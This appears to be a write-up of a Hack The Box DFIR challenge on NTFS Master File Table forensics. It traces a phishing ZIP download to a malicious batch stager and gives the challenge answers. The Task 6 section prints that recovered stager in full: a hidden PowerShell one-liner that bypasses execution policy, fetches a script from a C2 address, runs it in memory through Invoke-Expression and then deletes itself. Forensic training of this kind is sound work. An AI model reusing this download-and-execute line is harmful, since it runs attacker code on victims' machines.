# Bft

#windows #mft #dfir 
## Description

In this Sherlock, you will become acquainted with MFT (Master File Table) forensics. You will be introduced to well-known tools and methodologies for analyzing MFT artifacts to identify malicious activity. During our analysis, you will utilize the MFTECmd tool to parse the provided MFT file, TimeLine Explorer to open and analyze the results from the parsed MFT, and a Hex editor to recover file contents from the MFT.

> Password: hacktheblue

## Files 

We are given a [Master File Table](https://www.wikiwand.com/en/Master_File_Table) (MFT) which is a crucial component of the NTFS (New Technology File System), which is used by Windows operating systems. It serves as a special file that contains detailed information about every file and directory on the NTFS volume. 

```powershell
➜ ls

    Directory: ~\VBoxShare\BFT\C

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-----          07.07.2023    11:48      322437120 $MFT
```

### MFT Structure and Function

1. **Purpose**: The MFT acts as a central repository for metadata, storing information necessary for file system management. This includes file attributes, file sizes, timestamps, and pointers to the actual file data.
2. **Entries**: Each file and directory on the NTFS volume has at least one record in the MFT. Each record typically occupies 1 KB, but this can vary based on the file system's configuration and the complexity of the file.
3. **Attributes**: Each MFT entry contains several attributes, which are essentially pieces of information about the file or directory. Common attributes include:
   - **Standard Information**: Basic file properties, such as timestamps and permission flags.
   - **File Name**: The name of the file or directory.
   - **Data**: Pointers to the actual file data clusters.
   - **Index Root**: Information about directory structures.
   - **Security Descriptor**: Information about the file's security settings.
   - **Extended Attributes**: Additional metadata such as file version or user-defined properties.

4. **System Files**: Besides regular files and directories, the MFT also contains entries for system files essential for the NTFS volume's operation, such as:
   - **$MFT**: The MFT itself.
   - **$MFTMirr**: A mirror of the first few entries of the MFT to ensure recovery in case of corruption.
   - **$LogFile**: Transaction log of the file system to maintain consistency.
   - **$Bitmap**: Keeps track of free and used clusters on the volume.
   - **$Boot**: Contains the boot sector code.

### Advantages of MFT in NTFS

1. **Efficient Space Management**: NTFS uses a B-tree structure for the MFT, allowing for quick access and efficient space utilization.
2. **Robustness and Reliability**: The presence of a mirrored MFT and transaction logs ensures better recovery options and file system consistency, reducing the risk of data loss.
3. **Support for Large Volumes and Files**: NTFS, with its MFT, can handle large volumes (up to 256 TB) and large files, supporting advanced features like disk quotas, file compression, and encryption.

### How the MFT Works

When a file is created, deleted, or modified, the MFT is updated accordingly:
- **File Creation**: A new MFT entry is created, and the necessary attributes are populated.
- **File Deletion**: The corresponding MFT entry is marked as free, but the actual data remains until overwritten.
- **File Modification**: The MFT entry is updated with the new metadata, and pointers to new data clusters if the file grows.

### MFT in Data Recovery

In case of data corruption or accidental deletion, the MFT is a critical resource for data recovery tools. Since it contains comprehensive metadata about files and their locations on the disk, recovery tools can reconstruct lost or damaged files by reading and interpreting the MFT entries.

In summary, the Master File Table is a fundamental part of the NTFS file system, providing a structured and reliable way to manage files and directories on a disk volume. Its design ensures efficient storage management, robust error recovery, and support for advanced file system features.

## Tools

The room recommends using [MFTECmd](https://github.com/EricZimmerman/MFTECmd), but in one of the HTB CTF [Pursue-The-Tracks/](https://xhacka.github.io/posts/writeup/2024/03/14/Pursue-The-Tracks/) 

```powershell
➜ & "~\source\repos\MFTECmd\MFTECmd\bin\Debug\net6.0\MFTECmd.exe" -f '.\$MFT' --csv . --csvf .\parsed_mft.csv
```

[VSCode Hex Editor](https://marketplace.visualstudio.com/items?itemName=ms-vscode.hexeditor) (v1.9.14)

## Tasks

### 1. Simon Stark was targeted by attackers on February 13. He downloaded a ZIP file from a link received in an email. What was the name of the ZIP file he downloaded from the link?

Open the CSV in [Timeline Explorer](https://ericzimmerman.github.io/) . Filter `Last Access` column by Feb 13 and file path by `zip` extension. User downloads 2 zip files `KAPE` and `Stage-20240213T093324Z-001`. The [KAPE](https://ericzimmerman.github.io/KapeDocs/#!Pages%5C2.-Getting-started.md) is a legitimate program and the weirdly named zip smells sus

![Writeup.png](/assets/soc/sherlocks/bft/Writeup.png)

::: tip :bulb: Answer
`Stage-20240213T093324Z-001.zip`
:::

::: info Note
I used [mft](https://github.com/omerbenamram/mft) parser for initial phase since I had used it before, but next question answer is not in the csv generated by tool.
:::
### Task 2. Examine the Zone Identifier contents for the initially downloaded ZIP file. This field reveals the HostUrl from where the file was downloaded, serving as a valuable Indicator of Compromise (IOC) in our investigation/analysis. What is the full Host URL from where this ZIP file was downloaded?

Filter `Parent Path` by `stark` and `File Name` by `Stage`. We see only 1 zone identifier with HostUrl:

![Writeup-1.png](/assets/soc/sherlocks/bft/Writeup-1.png)

```ini
[ZoneTransfer]
ZoneId=3
HostUrl=https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser
```

::: tip :bulb: Answer
`https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser`
:::

### Task 3. What is the full path and name of the malicious file that executed malicious code and connected to a C2 server?

We know that zip file contained `invoice`  zip, if we filter by it we can see `invoice.bat` in the results:

![Writeup-2.png](/assets/soc/sherlocks/bft/Writeup-2.png)

::: tip :bulb: Answer
`C:\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice\invoices\invoice.bat`
:::

### Task 4. Analyze the $Created0x30 timestamp for the previously identified file. When was this file created on disk?

- **Created0x10**: STANDARD_INFO created timestamp
- **Created0x30**: FILE_NAME created timestamp
[DFIR-01 : $MFT](https://www.unh4ck.com/dfir/dfir-01-usdmft)

Check the next columns:

![Writeup-3.png](/assets/soc/sherlocks/bft/Writeup-3.png)

::: tip :bulb: Answer
`2024-02-13 16:38:39`
:::

### Task 5. Finding the hex offset of an MFT record is beneficial in many investigative scenarios. Find the hex offset of the stager file from Question 3.

Using regex search for invoice.bat: `i.n.v.o.i.c.e.\..b.a.t`. The filenames characters seem to be 2 byte in width.

![Writeup-4.png](/assets/soc/sherlocks/bft/Writeup-4.png)

`FILE0` is indicator of new file. Current `bat` file starts at `16E3000`

![Writeup-5.png](/assets/soc/sherlocks/bft/Writeup-5.png)

::: tip :bulb: Answer
`16E3000`
:::

> Hint: In MFT records, find the Entry Number value for the file in question. Multiply that number by 1024 (since this is the size of each record). The result is the offset in Decimal. Convert it to hex to find your answer.

```powershell
➜ "{0:X}" -f (23436 * 1024)
16E3000
```
### Task 6. Each MFT record is 1024 bytes in size. If a file on disk has smaller size than 1024 bytes, they can be stored directly on MFT File itself. These are called MFT Resident files. During Windows File system Investigation, its crucial to look for any malicious/suspicious files that may be resident in MFT. This way we can find contents of malicious files/scripts. Find the contents of The malicious stager identified in Question3 and answer with the C2 IP and port.

In VSCode hex editor you can copy hex bytes as Base64, after decoding we get easily readable text:

![Writeup-6.png](/assets/soc/sherlocks/bft/Writeup-6.png)


```powershell
@echo off
start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(\'http://43.204.110.203:6666/download/powershell/Om1hdHRpZmVzdGF\x03W9uIGV0dw==\') -UseBasicParsing|iex"
(goto) 2>nul & del "%~f0" 
```

The script invokes powershell, makes request to C2 server, downloads the powershell script and pipes it to [Invoke-Expression](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.4) which executes script in memory, without saving the file and executing in such manner.

::: tip :bulb: Answer
`43.204.110.203:6666`
:::

